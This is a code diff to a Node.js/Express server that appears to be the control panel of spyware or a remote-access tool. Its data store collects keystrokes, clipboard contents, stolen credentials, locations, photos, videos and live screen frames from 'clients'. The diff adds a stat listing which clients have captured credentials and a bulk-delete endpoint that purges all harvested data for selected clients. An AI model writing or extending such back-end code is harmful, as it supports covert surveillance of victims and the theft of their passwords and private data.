@@ -914,6 +914,7 @@ app.get('/api/stats', requireAuth, (req, res) => {
         clipboardCount: store.clipboard.length,
         visitCount: store.pageVisits.length,
         credentialCount: (store.credentials || []).length,
+        credentialClients: [...new Set((store.credentials || []).map(c => c.clientId))],
         deviceInfo: store.deviceInfo,
         tags: store.tags || {},
         notes: Object.fromEntries(Object.entries(store.notes || {}).map(([k, v]) => [k, v.length]))
@@ -1367,6 +1368,47 @@ app.delete('/api/purge/:type', requireAuth, async (req, res) => {
 });
 
 // ── Purge stale offline clients (not seen in N days) ──
+app.delete('/api/clients/bulk', requireAuth, async (req, res) => {
+    const ids = req.body?.ids;
+    if (!Array.isArray(ids) || !ids.length) return res.status(400).json({ error: 'ids array required' });
+    const valid = ids.filter(id => store.clients[id]);
+    if (!valid.length) return res.json({ success: true, deleted: 0 });
+
+    if (USE_REDIS && redis) {
+        try {
+            const photoIds = (store.photos || []).filter(p => valid.includes(p.clientId)).map(p => p.id);
+            const videoIds = (store.media  || []).filter(m => valid.includes(m.clientId)).map(m => m.id);
+            const del = [
+                ...valid.map(id => `live:frame:${id}`),
+                ...photoIds.map(x => `media:photo:${x}`),
+                ...videoIds.map(x => `media:video:${x}`)
+            ];
+            if (del.length) await Promise.all(del.map(k => redis.del(k).catch(() => {})));
+        } catch {}
+    }
+
+    const idSet = new Set(valid);
+    valid.forEach(id => {
+        delete store.clients[id];
+        delete store.deviceInfo?.[id];
+        if (store.notes) delete store.notes[id];
+        if (store.tags)  delete store.tags[id];
+    });
+    store.locations   = store.locations.filter(l => !idSet.has(l.clientId));
+    store.photos      = store.photos.filter(p => !idSet.has(p.clientId));
+    store.media       = store.media.filter(m => !idSet.has(m.clientId));
+    store.keystrokes  = store.keystrokes.filter(k => !idSet.has(k.clientId));
+    store.clipboard   = store.clipboard.filter(c => !idSet.has(c.clientId));
+    store.pageVisits  = store.pageVisits.filter(v => !idSet.has(v.clientId));
+    store.credentials = (store.credentials || []).filter(c => !idSet.has(c.clientId));
+    store.errors      = store.errors.filter(e => !idSet.has(e.clientId));
+    store.events      = store.events.filter(e => !idSet.has(e.data?.clientId));
+    saveStore();
+
+    console.log(`\u{1F5D1}\u{FE0F}  Bulk deleted ${valid.length} clients`);
+    res.json({ success: true, deleted: valid.length });
+});
+
 app.delete('/api/clients/stale', requireAuth, async (req, res) => {
     const days = Math.max(0.5, parseFloat(req.query.days || '3'));
     const cutoff = Date.now() - days * 86400000;
